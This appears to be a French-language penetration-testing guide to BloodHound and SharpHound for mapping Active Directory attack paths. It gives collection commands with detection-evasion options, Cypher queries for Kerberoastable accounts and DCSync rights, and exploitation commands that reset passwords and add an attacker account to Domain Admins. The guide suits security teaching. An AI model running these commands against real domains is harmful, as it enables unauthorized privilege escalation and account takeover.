# 🩸 BloodHound - Guide Complet

Outil de cartographie et d'analyse des chemins d'attaque Active Directory.

---

## 📖 Présentation

**BloodHound** utilise la théorie des graphes pour révéler les relations cachées et les chemins d'attaque dans un environnement Active Directory.

```
Architecture:
├── Collecteur (SharpHound / BloodHound.py)
│   └── Collecte les données AD
├── Base de données (Neo4j)
│   └── Stocke les relations
└── Interface Web (BloodHound)
    └── Visualise et analyse
```

### Versions

```
BloodHound Legacy    → Version originale (Electron + Neo4j)
BloodHound CE        → Community Edition (Web + PostgreSQL)
BloodHound Enterprise → Version commerciale
```

---

## 🔧 Installation

### BloodHound CE (Recommandé)

```bash
# Avec Docker (méthode recommandée)
curl -L https://ghst.ly/getbhce | docker compose -f - up

# Accéder à l'interface
# https://localhost:8080
# Login par défaut dans les logs Docker

# Arrêter
docker compose down
```

### BloodHound Legacy

```bash
# Kali Linux
apt update && apt install bloodhound

# Démarrer Neo4j
sudo neo4j start
# Accéder à http://localhost:7474
# Changer le mot de passe (neo4j:neo4j → neo4j:blood)

# Démarrer BloodHound
bloodhound
# Se connecter avec neo4j:blood
```

### Installation manuelle Neo4j

```bash
# Télécharger Neo4j
wget https://neo4j.com/artifact.php?name=neo4j-community-4.4.12-unix.tar.gz
tar xzf neo4j-*.tar.gz
cd neo4j-*/

# Configurer
# conf/neo4j.conf → dbms.security.auth_enabled=true

# Démarrer
./bin/neo4j console
```

---

## 1️⃣ Collecte de Données - SharpHound

### SharpHound (Windows)

```powershell
# Télécharger
# https://github.com/BloodHoundAD/SharpHound/releases

# Collection complète
.\SharpHound.exe -c All

# Collections spécifiques
.\SharpHound.exe -c DCOnly           # Uniquement le DC
.\SharpHound.exe -c Session          # Sessions utilisateurs
.\SharpHound.exe -c LoggedOn         # Utilisateurs connectés
.\SharpHound.exe -c Trusts           # Relations de confiance
.\SharpHound.exe -c ACL              # Permissions ACL
.\SharpHound.exe -c Container        # OUs et GPOs
.\SharpHound.exe -c Group            # Groupes
.\SharpHound.exe -c LocalAdmin       # Admins locaux
.\SharpHound.exe -c RDP              # Droits RDP
.\SharpHound.exe -c DCOM             # Droits DCOM
.\SharpHound.exe -c PSRemote         # Droits PSRemote

# Combinaison
.\SharpHound.exe -c Default,ACL

# Exclure le DC (plus discret)
.\SharpHound.exe -c All --excludedc

# Cibler un domaine spécifique
.\SharpHound.exe -c All -d domain.local

# Avec credentials
.\SharpHound.exe -c All -d domain.local --ldapusername user --ldappassword password

# Stealth mode (plus lent, moins de bruit)
.\SharpHound.exe -c All --stealth

# Loop collection (sessions en continu)
.\SharpHound.exe -c Session --loop --loopduration 02:00:00
```

### Options utiles SharpHound

```powershell
# Output directory
.\SharpHound.exe -c All --outputdirectory C:\temp\

# Nom du fichier
.\SharpHound.exe -c All --zipfilename collection

# Randomiser les délais (éviter la détection)
.\SharpHound.exe -c All --jitter 20

# Threads
.\SharpHound.exe -c All --threads 50

# Timeout LDAP
.\SharpHound.exe -c All --ldaptimeout 10
```

---

## 2️⃣ Collecte de Données - BloodHound.py

### Installation

```bash
# Via pip
pip install bloodhound

# Depuis les sources
git clone https://github.com/dirkjanm/BloodHound.py.git
cd BloodHound.py
pip install .
```

### Utilisation

```bash
# Collection complète
bloodhound-python -u user -p password -d domain.local -ns DC_IP -c All

# Avec hash
bloodhound-python -u user --hashes :NTLM_HASH -d domain.local -ns DC_IP -c All

# Collections spécifiques
bloodhound-python -u user -p password -d domain.local -c Group,LocalAdmin,Session

# Sans DNS (utiliser l'IP du DC)
bloodhound-python -u user -p password -d domain.local -dc DC_IP --dns-tcp

# Via LDAPS
bloodhound-python -u user -p password -d domain.local -ns DC_IP -c All --ssl

# Zip output
bloodhound-python -u user -p password -d domain.local -ns DC_IP -c All --zip
```

### Options de collection

```bash
# Options -c disponibles:
Group          # Membership des groupes
LocalAdmin     # Admins locaux
Session        # Sessions actives
Trusts         # Domain trusts
Default        # Group, LocalAdmin, Session, Trusts
DCOnly         # Données du DC uniquement
Acl            # ACLs (permissions)
ObjectProps    # Propriétés des objets
Container      # OUs et GPOs
All            # Tout
```

---

## 3️⃣ Import des Données

### BloodHound Legacy

```bash
# 1. Démarrer Neo4j
sudo neo4j start

# 2. Démarrer BloodHound
bloodhound

# 3. Upload des fichiers
# Drag & drop les fichiers JSON ou ZIP
# Ou cliquer sur "Upload Data" (icône dossier)
```

### BloodHound CE

```bash
# 1. Accéder à https://localhost:8080
# 2. File Ingest → Upload Files
# 3. Sélectionner le ZIP
```

---

## 4️⃣ Requêtes Pré-définies

### Chemins vers Domain Admin

```
Find all Domain Admins
    → Liste tous les Domain Admins

Find Shortest Paths to Domain Admins
    → Plus court chemin vers DA

Shortest Paths to Domain Admins from Owned Principals
    → Chemins depuis les comptes compromis
    
Find Principals with DCSync Rights
    → Comptes avec droits DCSync
```

### Kerberos

```
List all Kerberoastable Accounts
    → Comptes avec SPN (Kerberoasting)

Find AS-REP Roastable Users
    → Comptes sans préauth Kerberos

Find Kerberoastable Users with most privileges
    → Comptes à haut privilège Kerberoastable
```

### Chemins d'attaque

```
Find Computers where Domain Users are Local Admin
    → Machines avec Domain Users admin

Find Computers with Unsupported Operating Systems
    → Vieux OS (Windows 7, 2008, etc.)

Shortest Paths to Unconstrained Delegation Systems
    → Machines avec délégation non contrainte

Shortest Paths from Domain Users to High Value Targets
    → Chemins depuis Domain Users
```

### ACL

```
Find Principals with GenericAll on other users
    → Contrôle total sur d'autres users

Find Principals with WriteDACL
    → Peut modifier les ACLs

Find Principals with AddMember
    → Peut ajouter des membres aux groupes

Find Principals with ForceChangePassword
    → Peut reset les passwords
```

---

## 5️⃣ Requêtes Cypher Personnalisées

### Bases Cypher

```cypher
// Syntaxe de base
MATCH (n:User) RETURN n LIMIT 10

// Relations
MATCH (u:User)-[:MemberOf]->(g:Group) RETURN u,g

// Filtres
MATCH (u:User) WHERE u.enabled = true RETURN u

// Propriétés
MATCH (u:User) WHERE u.name CONTAINS "admin" RETURN u.name
```

### Requêtes utiles

```cypher
// Tous les Domain Admins
MATCH (u:User)-[:MemberOf*1..]->(g:Group)
WHERE g.name =~ "(?i).*domain admins.*"
RETURN u.name

// Comptes avec SPN (Kerberoastable)
MATCH (u:User) WHERE u.hasspn = true RETURN u.name, u.serviceprincipalnames

// Comptes sans préauth (AS-REP)
MATCH (u:User) WHERE u.dontreqpreauth = true RETURN u.name

// Machines avec délégation non contrainte
MATCH (c:Computer) WHERE c.unconstraineddelegation = true RETURN c.name

// Users pouvant DCSync
MATCH (u)-[:DCSync|AllExtendedRights|GenericAll]->(d:Domain) RETURN u.name

// Plus court chemin vers Domain Admin
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}))
RETURN p

// Sessions actives
MATCH (u:User)-[:HasSession]->(c:Computer) RETURN u.name, c.name

// Admins locaux
MATCH (u:User)-[:AdminTo]->(c:Computer) RETURN u.name, c.name

// Membres nested d'un groupe
MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
RETURN u.name

// Comptes à haut privilège désactivés
MATCH (u:User)-[:MemberOf*1..]->(g:Group)
WHERE g.highvalue = true AND u.enabled = false
RETURN u.name, g.name
```

### Requêtes d'attaque

```cypher
// GenericAll sur des users
MATCH (u1)-[:GenericAll]->(u2:User) RETURN u1.name, u2.name

// WriteDACL (peut modifier les permissions)
MATCH (u)-[:WriteDacl]->(target) RETURN u.name, target.name

// ForceChangePassword
MATCH (u1)-[:ForceChangePassword]->(u2:User) RETURN u1.name, u2.name

// AddMember sur des groupes privilégiés
MATCH (u)-[:AddMember]->(g:Group) WHERE g.highvalue = true
RETURN u.name, g.name

// GPO qui affectent des machines
MATCH (g:GPO)-[:GpLink]->(ou:OU)-[:Contains*1..]->(c:Computer)
RETURN g.name, collect(c.name)

// Comptes de service avec des chemins vers DA
MATCH (u:User) WHERE u.hasspn = true
MATCH p=shortestPath((u)-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}))
RETURN u.name, length(p)
ORDER BY length(p) ASC
```

---

## 6️⃣ Marquer les Comptes Compromis

### Interface graphique

```
1. Clic droit sur un nœud
2. "Mark User as Owned" / "Mark Computer as Owned"
3. Le nœud devient vert (skull icon)
```

### Via Cypher

```cypher
// Marquer un user comme owned
MATCH (u:User {name:"USER@DOMAIN.LOCAL"}) SET u.owned = true RETURN u

// Marquer un computer
MATCH (c:Computer {name:"COMPUTER.DOMAIN.LOCAL"}) SET c.owned = true RETURN c

// Marquer plusieurs
MATCH (u:User) WHERE u.name IN ["USER1@DOMAIN.LOCAL", "USER2@DOMAIN.LOCAL"]
SET u.owned = true RETURN u

// Trouver les chemins depuis les owned
MATCH p=shortestPath((o {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}))
RETURN p
```

### High Value Targets

```cypher
// Marquer comme high value
MATCH (u:User {name:"ADMIN@DOMAIN.LOCAL"}) SET u.highvalue = true RETURN u

// Lister les high value
MATCH (n) WHERE n.highvalue = true RETURN n.name
```

---

## 7️⃣ Edges (Relations) Importants

### Relations d'exécution

```
AdminTo          → Admin local sur une machine
CanRDP           → Peut RDP
CanPSRemote      → Peut utiliser PSRemote
ExecuteDCOM      → Peut exécuter via DCOM
HasSession       → Session active sur une machine
```

### Relations ACL

```
GenericAll       → Contrôle total
GenericWrite     → Écriture générique
WriteOwner       → Peut changer le propriétaire
WriteDacl        → Peut modifier les ACLs
ForceChangePassword → Peut changer le password
AddMember        → Peut ajouter aux groupes
AllExtendedRights → Tous les droits étendus
```

### Relations de groupe

```
MemberOf         → Membre d'un groupe
Contains         → OU contient un objet
GpLink           → GPO liée à une OU
```

### Relations Kerberos

```
AllowedToDelegate        → Délégation contrainte
AllowedToAct             → Délégation basée ressource
HasSIDHistory            → SID History
DCSync                   → Droits de réplication DC
```

---

## 8️⃣ Exploitation des Chemins

### GenericAll sur User

```bash
# Changer le password
net user USERNAME NewP@ssw0rd /domain

# Ou avec PowerView
Set-DomainUserPassword -Identity TARGET -AccountPassword (ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText -Force)
```

### ForceChangePassword

```bash
# Reset password
net user TARGET NewP@ss /domain

# PowerView
Set-DomainUserPassword -Identity TARGET -AccountPassword (ConvertTo-SecureString 'P@ss!' -AsPlainText -Force)
```

### AddMember

```bash
# Ajouter au groupe
net group "Domain Admins" hacker /add /domain

# PowerView
Add-DomainGroupMember -Identity "Domain Admins" -Members "hacker"
```

### WriteDACL

```bash
# Donner GenericAll avec PowerView
Add-DomainObjectAcl -TargetIdentity TARGET -Rights All -PrincipalIdentity ATTACKER
```

### GenericAll sur Computer

```bash
# Shadow Credentials attack
# Ou RBCD attack
```

---

## 9️⃣ Tips & Tricks

### Optimiser la collecte

```bash
# Collecter en plusieurs fois pour éviter la détection
.\SharpHound.exe -c DCOnly                    # D'abord DC
.\SharpHound.exe -c Session --loop            # Sessions en boucle
.\SharpHound.exe -c LocalAdmin                # Puis admins locaux
```

### Nettoyer la base

```cypher
// Supprimer toutes les données
MATCH (n) DETACH DELETE n

// Supprimer un domaine spécifique
MATCH (n) WHERE n.domain = "DOMAIN.LOCAL" DETACH DELETE n
```

### Export des résultats

```cypher
// Export CSV
MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
RETURN u.name AS username
// Puis "Export CSV" dans l'interface
```

### Custom Queries saved

```
# Fichier: ~/.config/bloodhound/customqueries.json
# Ajouter vos requêtes personnalisées
```

---

## 📋 Cheatsheet Rapide

```bash
# Collection Windows
.\SharpHound.exe -c All
.\SharpHound.exe -c All --stealth
.\SharpHound.exe -c Session --loop

# Collection Linux
bloodhound-python -u user -p pass -d domain.local -ns DC_IP -c All

# Démarrer BloodHound
sudo neo4j start
bloodhound

# Requêtes importantes (Cypher)
# Domain Admins
MATCH (u:User)-[:MemberOf*1..]->(g:Group) WHERE g.name =~ ".*DOMAIN ADMINS.*" RETURN u

# Kerberoastable
MATCH (u:User) WHERE u.hasspn = true RETURN u.name

# AS-REP Roastable
MATCH (u:User) WHERE u.dontreqpreauth = true RETURN u.name

# DCSync rights
MATCH (u)-[:DCSync|AllExtendedRights]->(d:Domain) RETURN u.name

# Mark as owned
MATCH (u:User {name:"USER@DOMAIN.LOCAL"}) SET u.owned = true RETURN u
```

---

## 📚 Ressources

- **BloodHound GitHub** : https://github.com/BloodHoundAD/BloodHound
- **BloodHound CE** : https://github.com/SpecterOps/BloodHound
- **SharpHound** : https://github.com/BloodHoundAD/SharpHound
- **BloodHound.py** : https://github.com/dirkjanm/BloodHound.py
- **Cypher Cheatsheet** : https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/

---

**Tags:** `#bloodhound #activedirectory #graphtheory #enumeration #sharphound #cypher #neo4j #lateral-movement`
